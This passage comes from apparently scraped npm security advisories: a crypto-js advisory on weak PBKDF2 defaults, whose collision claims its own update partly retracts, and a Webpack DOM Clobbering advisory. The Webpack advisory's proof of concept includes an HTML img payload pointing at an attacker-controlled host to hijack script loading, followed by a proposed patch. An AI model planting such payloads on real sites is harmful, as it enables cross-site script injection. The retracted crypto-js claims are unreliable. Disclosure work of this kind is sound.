This is because it both (1) defaults to [SHA1][SHA1 wiki], a cryptographic hash algorithm considered insecure [since at least 2005][Cryptanalysis of SHA-1] and (2) defaults to [one single iteration][one iteration src], a 'strength' or 'difficulty' value specified at 1,000 when specified in 1993. PBKDF2 relies on iteration count as a countermeasure to [preimage][preimage attack] and [collision][collision attack] attacks.  Potential Impact:  1. If used to protect passwords, the impact is high. 2. If used to generate signatures, the impact is high.  Probability / risk analysis / attack enumeration:  1. [For at most $45,000][SHA1 is a Shambles], an attacker, given control of only the beginning of a crypto-js PBKDF2 input, can create a value which has _identical cryptographic signature_ to any chosen known value. 4. Due to the [length extension attack] on SHA1, we can create a value that has identical signature to any _unknown_ value, provided it is prefixed by a known value. It does not matter if PBKDF2 applies '[salt][cryptographic salt]' or '[pepper][cryptographic pepper]' or any other secret unknown to the attacker. It will still create an identical signature.  Update: PBKDF2 requires a pseudo-random function that takes two inputs, so HMAC-SHA1 is used rather than plain SHA1. HMAC is not affected by [length extension attacks][Length Extension attack]. However, by defaulting to a single PBKDF2 iteration, the hashes do not benefit from the extra computational complexity that PBKDF2 is supposed to provide. The resulting hashes therefore have little protection against an offline brute-force attack.

This code has been the same since crypto-js was first created.  #### Further Cryptanalysis  The issue here is especially egregious because the length extension attack makes useless any secret that might be appended to the plaintext before calculating its signature.  Consider a scheme in which a secret is created for a user's username, and that secret is used to protect e.g. their passwords. Let's say that password is 'fake-password', and their username is 'example-username'.  To encrypt the user password via symmetric encryption we might do `encrypt(plaintext: 'fake-password', encryption_key: cryptojs.pbkdf2(value: 'example username' + salt_or_pepper))`. By this means, we would, in theory, create an `encryption_key` that can be determined from the public username, but which requires the secret `salt_or_pepper` to generate. This is a common scheme for protecting passwords, as exemplified in bcrypt & scrypt. Because the encryption key is symmetric, we can use this derived key to also decrypt the ciphertext.  Because of the length extension issue, if the attacker obtains (via attack 1), a collision with 'example username', the attacker _does not need to know_ `salt_or_pepper` to decrypt their account data, only their public username.  ### Description  PBKDF2 is a key-derivation is a key-derivation function that is used for two main purposes: (1) to stretch or squash a variable length password's entropy into a fixed size for consumption by another cryptographic operation and (2) to reduce the chance of downstream operations recovering the password input (for example, for password storage).  Unlike the modern [webcrypto](https://w3c.github.io/webcrypto/#pbkdf2-operations) standard, crypto-js does not throw an error when a number of iterations is not specified, and defaults to one single iteration. In the year 2000, when PBKDF2 was originally specified, the minimum number of iterations suggested was set at 1,000. Today, [OWASP recommends 1,300,000][OWASP PBKDF2 Cheatsheet]:  https://github.com/brix/crypto-js/blob/4dcaa7afd08f48cd285463b8f9499cdb242605fa/src/pbkdf2.js#L22-L26  ### Patches No available patch.

The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.  We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.   ### Details  #### Backgrounds  DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:  [1] https://scnps.co/papers/sp23_domclob.pdf [2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/   #### Gadgets found in Webpack  We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript) /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.  ### PoC  Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.  Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:  ``` // entry.js import('./import1.js')   .then(module => {     module.hello();   })   .catch(err => {     console.error('Failed to load module', err);   }); ```  ``` // import1.js export function hello () {   console.log('Hello'); } ```  The webpack.config.js is set up as follows: ``` const path = require('path');  module.exports = {   entry: './entry.js', // Ensure the correct path to your entry file   output: {     filename: 'webpack-gadgets.bundle.js', // Output bundle file     path: path.resolve(__dirname, 'dist'), // Output directory     publicPath: ""auto"", // Or leave this field not set   },   target: 'web',   mode: 'development', }; ```  When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.  ``` <!DOCTYPE html> <html> <head>   <title>Webpack Example</title>   <!-- Attacker-controlled Script-less HTML Element starts--!>   <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>   <!-- Attacker-controlled Script-less HTML Element ends--!> </head> <script src=""./dist/webpack-gadgets.bundle.js""></script> <body> </body> </html> ```  ### Impact  This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.  ### Patch  A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :> /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",NPM,"","","",MEDIUM,6.400000095367432,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H,HIGHEST,8,"","","","","","","",""
